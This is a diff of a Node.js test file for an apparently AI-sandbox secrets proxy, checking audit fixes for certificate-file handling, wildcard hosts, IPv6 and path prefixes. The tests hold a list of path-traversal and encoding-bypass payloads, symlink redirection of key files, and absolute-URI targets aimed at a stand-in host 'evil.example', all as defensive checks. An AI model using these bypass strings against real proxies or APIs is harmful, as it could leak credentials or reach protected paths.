@@ -4,8 +4,12 @@
 // file names from it, so the AI's user could make root write outside the
 // proxy's folder. Now a host is checked before anything else, the files are
 // named by a hash in a folder only root can open, and they are always created
-// new. Driven like the proxy tests in coder.test.mjs: raw requests, and curl
-// through the proxy to a stand-in site on this machine.
+// new. The audit's review of that fix added: inside a keyed site's tunnel only
+// a path is taken, a path prefix holds only for a plain path, names over 64
+// characters get a certificate, and the tests now pin the most recently used
+// sites, the folder emptied at each start and IPv6 over plain http://. Driven
+// like the proxy tests in coder.test.mjs: raw requests, and curl through the
+// proxy to a stand-in site on this machine.
 import test from "node:test";
 import assert from "node:assert/strict";
 import { mkdtemp } from "node:fs/promises";
@@ -17,7 +21,7 @@ import http from "node:http";
 import https from "node:https";
 import { execFile, execFileSync, spawnSync } from "node:child_process";
 import { createHash, createPrivateKey, X509Certificate } from "node:crypto";
-import { startProxy, connectTarget, proxyHost } from "../container/coder-proxy.mjs";
+import { startProxy, connectTarget, proxyHost, plainPath } from "../container/coder-proxy.mjs";
 import { hostMatches, hostAllowed } from "../container/coder-secrets.mjs";
 
 const sha = (s) => createHash("sha256").update(s).digest("hex");
@@ -72,19 +76,26 @@ test("CD95 audit (2026-11-06): a host that is not a plain DNS name, or a port ou
   } finally { await px.close(); }
 });
 
-test("CD96 audit (2026-11-06): each site's certificate files are named by a hash, in a folder only root can open, always created new (a link already there is never followed), only the most recent sites kept; a real subdomain of a wildcard secret still gets its certificate and its key", async () => {
+test("CD96 audit (2026-11-06): each site's certificate files are named by a hash, in a folder only root can open and emptied at each start, always created new (a link already there is never followed), only the most recently used sites kept; a real subdomain of a wildcard secret still gets its certificate and its key, a name over 64 characters too; inside its tunnel only a path is taken, and a path prefix holds only for a plain path", async () => {
   // A STAND-IN for the real sites: TLS on this machine, echoing the key it got.
   const d = await mkdtemp(join(tmpdir(), "coder-pxh-up-"));
-  execFileSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", join(d, "k"), "-out", join(d, "c"), "-days", "2", "-subj", "/CN=api.example.com", "-addext", "subjectAltName=DNS:api.example.com,DNS:deep.sub.example.com,DNS:example.com"], { stdio: "ignore" });
-  const up = https.createServer({ key: readFileSync(join(d, "k")), cert: readFileSync(join(d, "c")) }, (q, r) => r.end("auth=" + (q.headers.authorization || "none") + " host=" + q.headers.host + " path=" + q.url));
+  // A real name over 64 characters, as an S3 bucket's under "*.amazonaws.com" often is.
+  const long = "acme-data-lake-raw-events-production.s3.eu-central-1.storage.example.com";
+  assert.ok(long.length > 64);
+  execFileSync("openssl", ["req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", join(d, "k"), "-out", join(d, "c"), "-days", "2", "-subj", "/CN=api.example.com", "-addext", "subjectAltName=DNS:api.example.com,DNS:deep.sub.example.com,DNS:example.com,DNS:" + long], { stdio: "ignore" });
+  const seen = []; // every request the stand-in got
+  const up = https.createServer({ key: readFileSync(join(d, "k")), cert: readFileSync(join(d, "c")) }, (q, r) => { seen.push(q.url); r.end("auth=" + (q.headers.authorization || "none") + " host=" + q.headers.host + " path=" + q.url); });
   const upPort = await listen(up);
   const base = await mkdtemp(join(tmpdir(), "coder-pxh-"));
   chmodSync(base, 0o755); // like /srv: the AI's user can reach the proxy's public certificate
   const victim = join(base, "victim.txt");
   writeFileSync(victim, "untouched\n");
-  const px = await startProxy({ dir: join(base, "px"), upstream: { host: "127.0.0.1", port: upPort, ca: readFileSync(join(d, "c")) }, maxSites: 2 });
+  const opts = { dir: join(base, "px"), upstream: { host: "127.0.0.1", port: upPort, ca: readFileSync(join(d, "c")) }, maxSites: 2 };
+  const px = await startProxy(opts);
+  let px2 = null;
   try {
-    px.setSecrets([{ hosts: ["*.example.com"], paths: ["/v1/"], headers: [{ name: "Authorization", value: "Bearer k_wild_SECRET" }], raws: ["k_wild_SECRET"] }]);
+    const wild = { hosts: ["*.example.com"], paths: ["/v1/"], headers: [{ name: "Authorization", value: "Bearer k_wild_SECRET" }], raws: ["k_wild_SECRET"] };
+    px.setSecrets([wild]);
     px.setNetwork({ mode: "none" }); // a secret's sites are reachable even on None
     // THE FOLDER: root's only.
     const st = statSync(px.siteDir);
@@ -95,7 +106,9 @@ test("CD96 audit (2026-11-06): each site's certificate files are named by a hash
     const h = sha("api.example.com");
     for (const x of ["key", "csr", "pem", "ext"]) symlinkSync(victim, join(px.siteDir, h + "." + x));
     const env = { PATH: process.env.PATH, ...px.env() };
-    const curl = (u) => new Promise((ok) => execFile("curl", ["-sS", "--max-time", "20", u], { env }, (err, so, se) => ok(String(so) || String(se))));
+    const curl = (...a) => new Promise((ok) => execFile("curl", ["-sS", "--max-time", "20", ...a], { env }, (err, so, se) => ok(String(so) || String(se))));
+    // A request to api.example.com with exactly this target after the method (curl sends it as it is).
+    const raw = (target, ...a) => curl(...a, "--request-target", target, "https://api.example.com/");
     assert.equal(await curl("https://api.example.com/v1/balance"), "auth=Bearer k_wild_SECRET host=api.example.com path=/v1/balance", "a real subdomain: its certificate (trusted by the command) and the key");
     assert.equal(readFileSync(victim, "utf8"), "untouched\n", "the link's target was not written");
     assert.deepEqual(readdirSync(base).sort(), ["px", "victim.txt"]);
@@ -107,10 +120,24 @@ test("CD96 audit (2026-11-06): each site's certificate files are named by a hash
     // Its certificate and its key: for that name, from the proxy's authority, and a pair.
     const cert = new X509Certificate(readFileSync(join(px.siteDir, h + ".pem")));
     assert.equal(cert.subjectAltName, "DNS:api.example.com");
+    assert.equal(cert.subject, "CN=api.example.com", "an ordinary name keeps its common name");
     assert.ok(cert.checkIssued(new X509Certificate(readFileSync(px.caFile))), "signed by the proxy's authority");
     assert.ok(cert.checkPrivateKey(createPrivateKey(readFileSync(join(px.siteDir, h + ".key")))), "the key that goes with it");
     // PATH PREFIXES as before: outside /v1/ no key, and on None the site is not reachable there.
     assert.match(await curl("https://api.example.com/v2/other"), /Blocked by this repo's network list: api\.example\.com \(outside the secret's paths\)/);
+    // ...AND ONLY FOR A PLAIN PATH (the audit, 2026-11-06): websites read each of these
+    // as "/admin", outside "/v1/", so none gets the key, and on None none reaches the site.
+    const sent = seen.length;
+    for (const t of ["/v1/../admin", "/v1/%2e%2e/admin", "/v1/.%2E/admin", "/v1/..;/admin", "/v1/..%2fadmin", "/v1/..%5Cadmin", "/v1/..\\admin", "/v1/%252e%252e/admin", "/v1/x/../../admin", "/v1/..#x"]) {
+      assert.match(await raw(t), /Blocked by this repo's network list: api\.example\.com \(outside the secret's paths\)/, t);
+    }
+    assert.equal(seen.length, sent, "none of them reached the site");
+    for (const t of ["/v1/ok", "/v1/.well-known/x?a=../b", "/v1/a...b/file.txt", "/v1/projects/group%2Fproject"]) assert.equal(await raw(t), "auth=Bearer k_wild_SECRET host=api.example.com path=" + t, t);
+    for (const t of ["/v1/..", "/v1/.", "/v1/...", "/v1/..%20/admin", "/v1/..%00/admin", "/v1/..%3b/admin", "/v1/x;/../admin", "/v1/x#/../../admin", "/v1/%25252e%25252e/admin"]) assert.equal(plainPath(t), false, t);
+    for (const t of ["/", "/v1/a..b", "/v1/..a", "/v1/x?q=/../..", "/v1//x", "/v1/%zz", "/v1/;x"]) assert.equal(plainPath(t), true, t);
+    px.setNetwork({ mode: "full" }); // where the site is reachable anyway: reached, but without the key
+    assert.equal(await raw("/v1/../admin"), "auth=none host=api.example.com path=/v1/../admin");
+    px.setNetwork({ mode: "none" });
     // A deeper subdomain is covered by "*.example.com" too.
     assert.equal(await curl("https://deep.sub.example.com/v1/x"), "auth=Bearer k_wild_SECRET host=deep.sub.example.com path=/v1/x");
     // HASHES ONLY: no file in the proxy's folder is named after a site.
@@ -133,10 +160,51 @@ test("CD96 audit (2026-11-06): each site's certificate files are named by a hash
       assert.match(ls.stderr, /Permission denied/);
       assert.notEqual(as("cat", [join(px.siteDir, h + ".key")]).status, 0, "a site's key is root's");
     }
-  } finally { await px.close(); up.close(); }
+    // THE MOST RECENTLY USED, not just the newest made: example.com (made before
+    // api.example.com) is used again, so the next new site forgets api.example.com.
+    assert.match(await connect(px, "example.com:443"), /^HTTP\/1\.1 200 Connection Established/);
+    assert.match(await connect(px, "deep.sub.example.com:443"), /^HTTP\/1\.1 200 Connection Established/);
+    assert.deepEqual(names(), filesOf("example.com", "deep.sub.example.com"));
+    // A NAME OVER 64 CHARACTERS (the audit, 2026-11-06): openssl takes no common name
+    // that long, so its certificate names it only in the subjectAltName, which is
+    // what clients check. It used to get a bare 502.
+    assert.equal(await curl("https://" + long + "/v1/k"), "auth=Bearer k_wild_SECRET host=" + long + " path=/v1/k");
+    const lc = new X509Certificate(readFileSync(join(px.siteDir, sha(long) + ".pem")));
+    assert.equal(lc.subjectAltName, "DNS:" + long);
+    assert.equal(lc.subject, "O=Coder secrets proxy");
+    assert.ok(lc.checkIssued(new X509Certificate(readFileSync(px.caFile))));
+    // ONLY A PATH, NEVER A FULL ADDRESS (the audit, 2026-11-06). With a key for every
+    // path, "GET http://evil.example/x" inside api.example.com's tunnel was sent on with
+    // the key, and many front ends hand such a request to evil.example. Now 400, and
+    // nothing is sent.
+    px.setSecrets([{ ...wild, paths: [] }]);
+    const before = seen.length;
+    for (const t of ["http://evil.example/x", "https://evil.example:8443/x", "HTTP://EVIL.EXAMPLE/x", "*"]) {
+      assert.match(await raw(t, "-i"), /HTTP\/1\.1 400 [\s\S]*\r\n\r\nCoder's proxy: only a path \(starting with \/\) may be sent to api\.example\.com, not a full address$/, t);
+    }
+    assert.equal(seen.length, before, "nothing reached the site");
+    assert.equal(await raw("/admin/x"), "auth=Bearer k_wild_SECRET host=api.example.com path=/admin/x", "a path still gets the key");
+    // EMPTIED AT EACH START (the audit, 2026-11-06): the service starts the proxy again
+    // on the same folder (after a failed start, or when the service restarts), so no
+    // site's files, and nothing else left there, outlive the proxy that made them.
+    await px.close();
+    writeFileSync(join(px.siteDir, "stale.key"), "old\n");
+    symlinkSync(victim, join(px.siteDir, "stale-link"));
+    const ca = readFileSync(px.caFile, "utf8");
+    px2 = await startProxy(opts);
+    assert.equal(px2.siteDir, px.siteDir);
+    assert.deepEqual(readdirSync(px2.siteDir), [], "emptied");
+    assert.equal(statSync(px2.siteDir).mode & 0o777, 0o700, "still root's only");
+    assert.equal(readFileSync(px2.caFile, "utf8"), ca, "the authority is kept");
+    assert.equal(readFileSync(victim, "utf8"), "untouched\n", "the link was removed, not followed");
+    px2.setSecrets([wild]);
+    px2.setNetwork({ mode: "none" });
+    assert.match(await connect(px2, "example.com:443"), /^HTTP\/1\.1 200 Connection Established/);
+    assert.deepEqual(readdirSync(px2.siteDir).sort(), filesOf("example.com"), "and sites are made there again");
+  } finally { await px.close(); if (px2) await px2.close(); up.close(); }
 });
 
-test("CD97 audit (2026-11-06): hostMatches matches only real DNS names; the network levels, allowed sites without keys, and today's IPv4 and IPv6 handling stay as they were", async () => {
+test("CD97 audit (2026-11-06): hostMatches matches only real DNS names; the network levels, allowed sites without keys, and today's IPv4 and IPv6 handling stay as they were, and plain http:// hands on an IPv6 address without its brackets", async () => {
   // THE RULE: real subdomains match a wildcard; anything shaped like a path never does.
   for (const ok of ["api.example.com", "API.Example.COM", "example.com", "deep.sub.example.com", "x-1.example.com"]) assert.equal(hostMatches(ok, "*.example.com"), true, ok);
   assert.equal(hostMatches("api.example.com", "api.example.com"), true);
@@ -190,7 +258,14 @@ test("CD97 audit (2026-11-06): hostMatches matches only real DNS names; the netw
     // IPv6 in brackets is let through on Full (this machine may have no IPv6, so the
     // connection itself may fail with 502, but never 400 or 403).
     assert.doesNotMatch(await connect(px, "[::1]:" + echoPort), /^HTTP\/1\.1 40[03] /, "Full: CONNECT to [::1]");
-    assert.doesNotMatch(await get(px, "http://[::1]:" + webPort + "/"), /^HTTP\/1\.1 40[03] /, "Full: http:// to [::1]");
+    // Plain http:// hands Node the address without its brackets (the audit, 2026-11-06):
+    // with them, Node looked "[::1]" up as a name, so it never worked. Checked where the
+    // proxy hands it on (the proxy's "node:http" is this one), since the answer here is
+    // 502 either way: the stand-in listens on IPv4 only, and this machine may have no IPv6.
+    const handed = [], realRequest = http.request;
+    http.request = (o, ...rest) => { handed.push(o && o.host); return realRequest.call(http, o, ...rest); };
+    try { assert.doesNotMatch(await get(px, "http://[::1]:" + webPort + "/"), /^HTTP\/1\.1 40[03] /, "Full: http:// to [::1]"); } finally { http.request = realRequest; }
+    assert.deepEqual(handed, ["::1"], "the address, without brackets");
     for (const mode of ["trusted", "custom", "none"]) {
       px.setNetwork({ mode, hosts: ["*.allowed.example"], defaults: true });
       for (const t of ["127.0.0.1:" + echoPort, "[::1]:" + echoPort, "localhost:" + echoPort]) assert.match(await connect(px, t), /^HTTP\/1\.1 403 /, mode + ": CONNECT " + t);
